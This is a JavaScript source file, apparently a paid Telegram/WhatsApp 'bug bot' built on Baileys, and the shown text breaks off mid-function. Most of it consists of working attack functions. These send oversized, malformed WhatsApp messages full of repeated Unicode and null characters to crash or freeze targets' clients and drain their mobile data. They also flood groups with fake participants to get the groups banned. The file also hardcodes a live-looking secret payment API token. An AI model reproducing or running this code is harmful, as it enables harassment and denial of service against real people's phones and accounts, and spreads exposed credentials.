/*
 * Created By X-For
 * (Don't Delete Credits)
 */
const { Telegraf, Markup } = require("telegraf");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const chalk = require("chalk");
const axios = require("axios");
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");
const pino = require("pino");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestWaWebVersion,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");

const config = require("./database/config.js");
const db = require("./database/db.js");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;

const BUATQRIS_API = "https://api.buatqris.site";
const BUATQRIS_ACCOUNT_ID = "user_6abe29e336b073.70065205";
const BUATQRIS_SECRET_TOKEN = "sk_live_baf0b9430ad4a35c016369eb259e7de3d33c4a31005cd21dec9d08957697c099";

const QRIS_PACKAGES = {
  "Paket Perhari":   { price: 1000,  durationMs: 24 * 60 * 60 * 1000,        role: "member" },
  "Paket Permanen":  { price: 5000,  durationMs: 3650 * 24 * 60 * 60 * 1000, role: "member" },
  "Paket Reseller":  { price: 10000, durationMs: 3650 * 24 * 60 * 60 * 1000, role: "reseller" },
  "Paket Moderator": { price: 15000, durationMs: 3650 * 24 * 60 * 60 * 1000, role: "moderator" },
  "Paket Owner":     { price: 20000, durationMs: 3650 * 24 * 60 * 60 * 1000, role: "owner" },
};

const pendingQrisTx = new Map();

// Single concurrent web-login per username
// username -> { sessionId, lastSeen }
const activeWebSessions = new Map();
const WEB_SESSION_IDLE_MS = 7 * 24 * 60 * 60 * 1000; // 7 hari idle = auto lepas slot

function makeSessionId() {
  return crypto.randomBytes(16).toString("hex");
}

function touchWebSession(username) {
  const s = activeWebSessions.get(username);
  if (s) s.lastSeen = Date.now();
}

function isWebSessionActive(username, sessionId) {
  const s = activeWebSessions.get(username);
  if (!s || !sessionId || s.sessionId !== sessionId) return false;
  if (Date.now() - s.lastSeen > WEB_SESSION_IDLE_MS) {
    activeWebSessions.delete(username);
    return false;
  }
  return true;
}

function claimWebSession(username) {
  const sessionId = makeSessionId();
  activeWebSessions.set(username, { sessionId, lastSeen: Date.now() });
  return sessionId;
}

function releaseWebSession(username, sessionId) {
  const s = activeWebSessions.get(username);
  if (s && (!sessionId || s.sessionId === sessionId)) {
    activeWebSessions.delete(username);
  }
}

const PATHS = {
  sessionsDir: "./auth",
  akses: "./database/akses.json",
  userSessions: path.join(__dirname, "user_sessions.json"),
  pendingInvites: path.join(__dirname, "pending_invites.json"),
  chatMessages: path.join(__dirname, "chat_messages.json"),
  statuses: path.join(__dirname, "statuses.json"),
  berita: path.join(__dirname, "berita.json"),
  beritaMediaDir: path.join(__dirname, "public", "berita"),
};

const MAX_RELOAD_ATTEMPTS = 3;
const HEALTH_CHECK_INTERVAL = 10 * 60 * 1000;
const AUTO_RELOAD_DELAY = 15000;

const bot = new Telegraf(tokens);
const app = express();
app.use(cors());

const sessions = new Map();
const userEvents = new Map();
const listenerRegistry = new Map();
const pendingActions = new Map();

let reloadAttempts = 0;
let healthCheckRunning = false;

function setPendingAction(userId, action, msgId, timeoutMs = 60000) {
  clearPendingAction(userId);
  const timeout = setTimeout(() => pendingActions.delete(userId.toString()), timeoutMs);
  pendingActions.set(userId.toString(), { action, msgId, timeout });
}

function getPendingAction(userId) {
  return pendingActions.get(userId.toString());
}

function clearPendingAction(userId) {
  const existing = pendingActions.get(userId.toString());
  if (existing) {
    clearTimeout(existing.timeout);
    pendingActions.delete(userId.toString());
  }
}

function ensureJsonFile(filePath, fallback, label) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(fallback, null, 2), "utf-8");
    console.log(`📁 Created ${label || path.basename(filePath)}`);
  }
}

ensureJsonFile(PATHS.pendingInvites, {});
ensureJsonFile(PATHS.chatMessages, []);
ensureJsonFile(PATHS.statuses, []);
ensureJsonFile(PATHS.berita, []);

if (!fs.existsSync(PATHS.beritaMediaDir)) {
  fs.mkdirSync(PATHS.beritaMediaDir, { recursive: true });
  console.log("📁 Created public/berita/");
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function generateKey(length = 6) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () =>
    chars.charAt(Math.floor(Math.random() * chars.length))
  ).join("");
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

const loadAkses = () => {
  const data = db.loadAkses() || {};
  if (!Array.isArray(data.owners)) data.owners = [];
  if (!Array.isArray(data.moderators)) data.moderators = [];
  if (!Array.isArray(data.resellers)) data.resellers = [];
  if (!Array.isArray(data.pts)) data.pts = [];
  return data;
};
const saveAkses = (data) => db.saveAkses(data);

function isOwner(id) {
  const data = loadAkses();
  return (data.owners || []).includes(id.toString());
}

function isMainOwner(id) {
  return ownerIds.map((x) => x.toString()).includes(id.toString());
}

function getUsers() {
  try {
    return db.getUsers();
  } catch (err) {
    console.error("✗ Read failed:", err);
    return [];
  }
}

function saveUsers(users) {
  try {
    db.saveUsers(users);
    console.log("✓ User data saved.");
  } catch (err) {
    console.error("✗ Save failed:", err);
  }
}

function loadUserSessions() {
  try {
    const data = db.loadUserSessions();
    const count = Object.values(data).reduce(
      (acc, n) => acc + (Array.isArray(n) ? n.length : 0),
      0
    );
    console.log(
      `[SESSION] 📂 Loaded ${count} sessions from ${Object.keys(data).length} users`
    );
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error:", err);
    return {};
  }
}

function saveUserSessions(data) {
  try {
    db.saveUserSessions(data);
    const count = Object.values(data || {}).reduce(
      (acc, n) => acc + (Array.isArray(n) ? n.length : 0),
      0
    );
    console.log(
      `[SESSION] 💾 Saved ${count} sessions for ${Object.keys(data || {}).length} users`
    );
  } catch (err) {
    console.error("❌ Save user sessions failed:", err);
  }
}

const userSessionPath = (username, BotNumber) => {
  const dir = path.join(PATHS.sessionsDir, "users", username, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function normalizePhoneNumber(raw) {
  let n = String(raw || "").replace(/\D/g, "");
  if (!n) return "";
  if (n.startsWith("0") && n.length >= 10 && n.length <= 13) {
    n = "62" + n.slice(1);
  }
  if (n.startsWith("8") && n.length >= 9 && n.length <= 12 && !n.startsWith("62")) {
    n = "62" + n;
  }
  return n;
}

function hasRegisteredCreds(sessionDir) {
  try {
    const credsPath = path.join(sessionDir, "creds.json");
    if (!fs.existsSync(credsPath)) return false;
    const creds = JSON.parse(fs.readFileSync(credsPath, "utf-8"));
    return !!(creds && creds.registered === true && creds.me);
  } catch {
    return false;
  }
}

function clearUnregisteredSession(sessionDir) {
  try {
    if (!fs.existsSync(sessionDir)) return;
    if (hasRegisteredCreds(sessionDir)) return;
    fs.rmSync(sessionDir, { recursive: true, force: true });
    fs.mkdirSync(sessionDir, { recursive: true });
    console.log(`[SESSION] Cleared unregistered session: ${sessionDir}`);
  } catch (e) {
    console.error("[SESSION] clear error:", e.message);
  }
}

function findUserSession(username, senderNumber = null) {
  for (const [key, sock] of sessions) {
    const idx = key.indexOf("_");
    if (idx === -1) continue;
    const keyUser = key.substring(0, idx);
    const keyNum = key.substring(idx + 1);
    if (keyUser === username) {
      if (senderNumber === null || keyNum === senderNumber) {
        return { sock, number: keyNum, key };
      }
    }
  }
  return null;
}

const safeWritePendingInvites = (data) => {
  try {
    db.savePendingInvites(data);
  } catch (err) {
    console.error("[PENDING] write error:", err.message);
  }
};

const safeReadPendingInvites = () => {
  try {
    return db.loadPendingInvites();
  } catch {
    return {};
  }
};

const loadChatMessages = () => db.loadChatMessagesHydrated();
const saveChatMessages = (messages) => db.saveChatMessages(messages);

function broadcastChatEvent(eventData, excludeUser = null) {
  userEvents.forEach((res, username) => {
    if (excludeUser && username === excludeUser) return;
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch {
      userEvents.delete(username);
    }
  });
}

function sendEventToUser(username, eventData) {
  if (!userEvents.has(username)) return;
  const res = userEvents.get(username);
  try {
    res.write(`data: ${JSON.stringify(eventData)}\n\n`);
  } catch (err) {
    console.error(`[Events] Error → ${username}:`, err.message);
    userEvents.delete(username);
  }
}

function getUserRole(username) {
  const data = loadAkses();
  const id = username.toString();
  if ((data.owners || []).includes(id) || isMainOwner(id)) return "Owner";
  if ((data.moderators || []).includes(id)) return "Moderator";
  if ((data.resellers || []).includes(id)) return "Reseller";
  if ((data.pts || []).includes(id)) return "PT";
  return "Member";
}

function getOnlineUsers() {
  return Array.from(userEvents.keys()).map((username) => ({
    username,
    role: getUserRole(username),
  }));
}

function broadcastOnlineStatus() {
  broadcastChatEvent({ type: "online_status", online: getOnlineUsers() }, null);
}

const loadStatuses = () => db.loadStatuses();
const saveStatuses = (list) => db.saveStatuses(list);

function broadcastStatusEvent(eventData) {
  broadcastChatEvent(eventData, null);
}

function loadBerita() {
  try {
    if (!fs.existsSync(PATHS.berita)) return [];
    return JSON.parse(fs.readFileSync(PATHS.berita, "utf-8")) || [];
  } catch (e) {
    console.error("[BERITA] load error:", e.message);
    return [];
  }
}

function saveBerita(list) {
  try {
    fs.writeFileSync(PATHS.berita, JSON.stringify(list, null, 2), "utf-8");
  } catch (e) {
    console.error("[BERITA] save error:", e.message);
  }
}

function deleteBeritaPhoto(photoPath) {
  try {
    if (photoPath && photoPath.startsWith("/berita/")) {
      const fpath = path.join(PATHS.beritaMediaDir, path.basename(photoPath));
      if (fs.existsSync(fpath)) fs.unlinkSync(fpath);
    }
  } catch {}
}

async function saveBeritaPhotoFromTelegram(ctx, fileId) {
  const fileLink = await ctx.telegram.getFileLink(fileId);
  const resp = await axios.get(fileLink.href, { responseType: "arraybuffer" });
  const fileName =
    "berita_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7) + ".jpg";
  fs.writeFileSync(path.join(PATHS.beritaMediaDir, fileName), Buffer.from(resp.data));
  return "/berita/" + fileName;
}

async function BandGb(mexx, groupJid) {
  if (!groupJid.endsWith("@g.us")) throw new Error("@g.us server required");
  const resolveJid = (raw) => {
    let s = String(raw || "").trim();
    if (s.includes("@")) return s;
    return s.replace(/\D/g, "") + "@s.whatsapp.net";
  };
  const jids = (Array.isArray(groupJid) ? groupJid : [groupJid])
    .map(resolveJid)
    .filter((j) => j.length > 15);
  if (!jids.length) throw new Error("No valid JIDs");

  for (let i = 0; i < jids.length; i++) {
    const group = jids[i];
    try { await mexx.groupParticipantsUpdate(group, ["13135550002@s.whatsapp.net"], "add"); } catch {}
    try { await mexx.groupParticipantsUpdate(group, ["971500000000@s.whatsapp.net"], "add"); } catch {}
    try { await mexx.sendPresenceUpdate("composing", group); } catch {}
    try {
      const fakeNumbers = Array.from({ length: 100 }, () =>
        Math.floor(Math.random() * 9000000000000) + 1000000000000 + "@s.whatsapp.net"
      );
      for (const fakeJid of fakeNumbers) {
        await mexx.groupParticipantsUpdate(group, [fakeJid], "add").catch(() => {});
        // ✅ FIX: delay 60ms (hindari rate-limit WA)
        await new Promise((r) => setTimeout(r, 60));
      }
      await mexx.sendMessage(group, { text: "wkwk ke ban" }).catch(() => {});
    } catch {}
  }
}

async function CrashGruB(mexx, groupJid) {
  await mexx.relayMessage(
    groupJid,
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "izin @Lifzbarz" + "ꦽ".repeat(90000),
        publisher: "Wa.me/stickerpack/null" + "𑇂𑆵𑆴𑆿".repeat(10000),
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, emojis: ["🗿"], accessibilityLabel: "Wa.me/stickerpack/@Bapaklo", isLottie: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, emojis: ["🩲"], accessibilityLabel: "Wa.me/stickerpack/@Bapaklo", isLottie: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, emojis: ["😹"], accessibilityLabel: "Wa.me/stickerpack/@Bapaklo", isLottie: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, emojis: ["🎭"], accessibilityLabel: "Wa.me/stickerpack/@Bapaklo", isLottie: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, emojis: ["🤣"], accessibilityLabel: "Wa.me/stickerpack/@Bapaklo", isLottie: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, emojis: ["👻"], accessibilityLabel: "Wa.me/stickerpack/@Bapaklo", isLottie: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, emojis: ["🤑"], accessibilityLabel: "Wa.me/stickerpack/@Bapaklo", isLottie: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, emojis: ["😘"], accessibilityLabel: "Wa.me/stickerpack/@Bapaklo", isLottie: false, mimetype: "image/webp" },
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath:
          "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 900000000)}@s.whatsapp.net`
          ),
        },
        packDescription: "\0".repeat(90000),
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36Ff900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
      },
    },
    {}
  );
}

async function DelayInternal(mexx, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "izin @Lifzbarz" },
          NativeFlowMessage: {
            buttons: ["0@s.whatsapp.net", ...Array.from({ length: 1999 })],
            name: "\x10".repeat(50000),
          },
          nativeFlowMessage: {
            name: "galaxy_message",
            buttons: "\u0000".repeat(250000) + "\x10".repeat(250000),
          },
        },
      },
    },
  };
  await mexx.relayMessage(target, msg, {});
}

async function FreezeLock(mexx, target) {
  await mexx.relayMessage(
    target,
    {
      messageContextInfo: { type: 6 },
      deviceListMetadata: {},
      callLogMessage: {},
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "izin @Lifzbarz" },
            footer: { text: "𝐓͢𝐇͡𝐄 𝐄͜𝐗͢𝐄𝐂𝐔𝐓𝐎𝐑" },
            nativeFlowMessage: {
              extra: "\u31040",
              buttons: "A".repeat(9999),
              id: "booking_loking_mesaage",
              name: "galaxy_mesaage_number",
              extra1: "\u0000".repeat(5544),
              extra2: "\u0000".repeat(5544),
              callLogMessage: {},
              richResponseMessage: {},
            },
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999999999,
            },
          },
        },
      },
    },
    {}
  );
}

async function attackCrashGB(mexx, groupJid, iterations = 50) {
  try {
    console.log(`[BUG GB] 🎯 CRASH: ${groupJid} | ${iterations}x`);
    for (let i = 0; i < iterations; i++) {
      await CrashGruB(mexx, groupJid);
      await sleep(500);
      if ((i + 1) % 5 === 0) console.log(`[BUG GB] 📊 ${i + 1}/${iterations}`);
    }
    return { success: true, mode: "crash", totalIterations: iterations };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

async function attackGbanGB(mexx, groupJid, iterations = 50) {
  try {
    console.log(`[BUG GB] 🎯 GBAN: ${groupJid} | ${iterations}x`);
    for (let i = 0; i < iterations; i++) {
      await BandGb(mexx, groupJid);
      await sleep(500);
      if ((i + 1) % 5 === 0) console.log(`[BUG GB] 📊 ${i + 1}/${iterations}`);
    }
    return { success: true, mode: "gban", totalIterations: iterations };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

async function DelayGroup(mexx, groupJid, iterations = 50) {
  try {
    console.log(`[DELAY GB] 🎯 ${groupJid} | ${iterations}x`);
    for (let i = 0; i < iterations; i++) {
      await DelayInternal(mexx, groupJid);
      await sleep(300);
      await FreezeLock(mexx, groupJid);
      await sleep(300);
      if ((i + 1) % 5 === 0) console.log(`[DELAY GB] 📊 ${i + 1}/${iterations}`);
    }
    return { success: true, mode: "delay", totalIterations: iterations };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

const groupModeMap = {
  crash: attackCrashGB,
  gban: attackGbanGB,
  dgroup: DelayGroup,
};

async function runGroupAttack(sock, groupJid, mode = "crash", iterations = 50) {
  const fn = groupModeMap[mode];
  if (!fn) {
    throw new Error(
      `Invalid mode: ${mode}. Options: ${Object.keys(groupModeMap).join(", ")}`
    );
  }
  return await fn(sock, groupJid, iterations);
}

async function IossPler(mexx, target) {
  const iosstext =
    ". ҉izin @Lifzbarz🔪🩸ৌো্ৄি়ী⛇有ৣ◼়̾ aৈািে⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
  const iossvip = "𑇂𑆵𑆴𑆿".repeat(60000);

  try {
    const _0x46a714 = {
      degreesLatitude: 11.11,
      degreesLongitude: -11.11,
      name:
        "izin @Lifzbarz🔪🩸ৌো্ৄি়ীႸFONT 玗SIGN在 FUNC،EXPLA有 ٝONٝ SIGN" +
        "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/@Lifzbarz",
    };
    const _0x1f9425 = generateWAMessageFromContent(
      target,
      { viewOnceMessage: { message: { locationMessagex: _0x46a714 } } },
      {}
    );
    const _0x127e44 = {
      extendedTextMessage: {
        text: "izin @Lifzbarz🔪🩸ৌো्ৣি়ী涨幅都significant我们" + iossvip,
        matchedText:
          "izin @Lifzbarz🔪🩸ৌো்ிtonic༗ 扩大，新的مخطط ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ",
        description: "𑇂𑆵𑆴𑆿".repeat(60000),
        title:
          "‼️⃟𝕺⃰‌alz‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
        previewType: "NONE",
        jpegThumbnail: "",
        thumbnailDirectPath:
          "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };
    const _0x10f725 = generateWAMessageFromContent(
      target,
      { viewOnceMessage: { message: { extendMsgx: _0x127e44 } } },
      {}
    );
    const _0x2d19b3 = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\0" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\0" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: "https://st-gacor." + "𑇂𑆵𑆴𑆿".repeat(25000) + ".com",
    };
    const _0x3b212a = generateWAMessageFromContent(
      target,
      { viewOnceMessage: { message: { locationMessage: _0x2d19b3 } } },
      {}
    );
    const _0x45cdb4 = {
      extendedTextMessage: {
        text:
          "izin @Lifzbarz🔪🩸ৌো்ிtonic৹ 扩大，新的مخطط ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" +
          iosstext,
        matchedText: "izin @Lifzbarz🔪🩸ৌো்ிtonic؈ 扩大",
        description: "𑇂𑆵𑆴𑆿".repeat(25000),
        title:
          "izin @Lifzbarz🔪🩸ৌো்ிtonicّ 扩大，新的مخطط" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "<base64-jpeg-thumbnail>",
        thumbnailDirectPath:
          "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };
    const _0xd7d4d = generateWAMessageFromContent(
      target,
      { viewOnceMessage: { message: { extendMsg: _0x45cdb4 } } },
      {}
    );
    const _0x5ab872 = generateWAMessageFromContent(
      target,
      { viewOnceMessage: { message: { locationMessage: _0x2d19b3 } } },
      {}
    );

    const additionalNodes = [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ];

    const statusRelay = (msgPayload, msgId) =>
      mexx.relayMessage("status@broadcast", msgPayload.message, {
        messageId: msgId,
        statusJidList: [target],
        additionalNodes,
      });

    for (let i = 0; i < 10; i++) {
      await statusRelay(_0x3b212a, _0x3b212a.key.id);
      await statusRelay(_0xd7d4d, _0xd7d4d.key.id);
      await statusRelay(_0x3b212a, _0x1f9425.key.id);
      await statusRelay(_0xd7d4d, _0x10f725.key.id);
      await statusRelay(_0x5ab872, _0xd7d4d.key.id);
      if (i < 9) await sleep(5000);
    }
  } catch (err) {
    console.error(err);
  }
}

// ✅ FIX: BullKuota pakai crypto.randomBytes (hemat memori)
async function BullKuota(mexx, target) {
  try {
    const imageBuffer = crypto.randomBytes(2 * 1024 * 1024); // 2MB real
    const thumbBuffer = crypto.randomBytes(512 * 1024);      // 512KB real
    const FAKE_FILE_LENGTH = (100 * 1024 * 1024).toString(); // 100MB fake

    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: crypto.randomBytes(32),
              fileLength: FAKE_FILE_LENGTH,
              height: 9999999999999999999999999,
              width: -999999999,
              mediaKey: crypto.randomBytes(32),
              fileEncSha256: crypto.randomBytes(32),
              directPath:
                "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
              mediaKeyTimestamp: Math.floor(Date.now() / 10000),
              caption: "Sucker Data Explosion (🔥)",
              jpegThumbnail: thumbBuffer,
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                forwardingScore: 999999999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "120363424572003216@newsletter",
                  newsletterName: "🩸" + "𑇂𑆵".repeat(15000),
                  serverMessageId: 3,
                },
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING",
                },
              },
            },
          },
        },
      },
      { userJid: target }
    );

    await mexx.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      participants: { jid: target },
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });
    console.log("Otw Sedot Kuota", target);
  } catch {}
}

async function DelayAll(mexx, target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
  const isGroup = jid.endsWith("@g.us");
  const optsParticipant = isGroup ? { participant: true } : {};

  await mexx.relayMessage(
    jid,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "izin @mexxreall" },
            NativeFlowMessage: {
              buttons: ["0@s.whatsapp.net", ...Array.from({ length: 1999 })],
              name: "\x10".repeat(50000),
            },
            nativeFlowMessage: {
              name: "galaxy_message",
              buttons: "\u0000".repeat(250000) + "\x10".repeat(250000),
            },
          },
        },
      },
    },
    {}
  );

  await mexx.relayMessage(
    jid,
    {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net",
              },
            },
            body: { text: "\x10".repeat(5000) },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(9999),
              buttons: Array.from({ length: 500000 }, () => ({})),
            },
          },
        },
      },
    },
    optsParticipant
  );

  const payloadV3 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "⎈" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
            nativeFlowResponsMessage: {
              buttons: Array.from({ length: 500000 }, () => ({})),
            },
          },
        },
      },
    },
  };
  for (let i = 0; i < 500; i++) {
    await mexx.relayMessage(jid, payloadV3, {});
    await sleep(20);
  }

  await mexx.relayMessage(
    jid,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "izin @mexxreall" + "\0".repeat(20000), format: "FOUR" },
            nativeFlowMessage: {
              name: "cta_call",
              buttonParamsJson: "\0",
              buttons: Array.from({ length: 500000 }, () => ({})),
            },
            contextInfo: { quotedMessage: { richResponseMessage: {} } },
          },
        },
      },
    },
    { noSelfSync: true }
  );

  for (let i = 0; i < 2; i++) {
    await sleep(500);
    const msg = generateWAMessageFromContent(
      jid,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: { text: "ี".repeat(5000) },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: "ี".repeat(500000),
              },
              contextInfo: {
                remoteJid: "#",
                externalAdReply: {
                  showAdAttribution: true,
                  title: "vault!nspect",
                  body: "superior3xplanation",
                  thumbnailUrl: "https://files.catbox.moe/ur8m20.jpg",
                  sourceUrl: "https://vsp-killer.gov/",
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            },
          },
        },
      },
      {}
    );
    await mexx.relayMessage(jid, msg.message, {});
    await mexx.chatModify(
      {
        delete: true,
        lastMessages: [
          {
            key: { remoteJid: jid, fromMe: true, id: msg.key.id },
            messageTimestamp: Date.now(),
          },
        ],
      },
      jid
    );
  }
  console.log("sukses kirim paket", jid);
}

// ✅ FIX: parameter sudah benar (mexx=socket, target=jid)
async function fclow(mexx, target) {
  const content = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          header: {
            bloksWidget: {
              fallback: "\u200D".repeat(1000),
              type: "\u200F".repeat(1000),
              data: "[".repeat(1000),
              uuid: "\u200B".repeat(1000),
            },
            subtitle: "\u0010".repeat(1000),
            title: "X".repeat(1000),
          },
          body: { text: "\u000F" },
          nativeFlowMessage: { buttons: [] },
        },
      },
    },
  };
  return await mexx.sendMessage(target, content);
}

// ✅ FIX: participant hanya untuk group
async function LendUpLah(mexx, target) {
  const kxa = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Lelend Up Func?Bahaya"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({})),
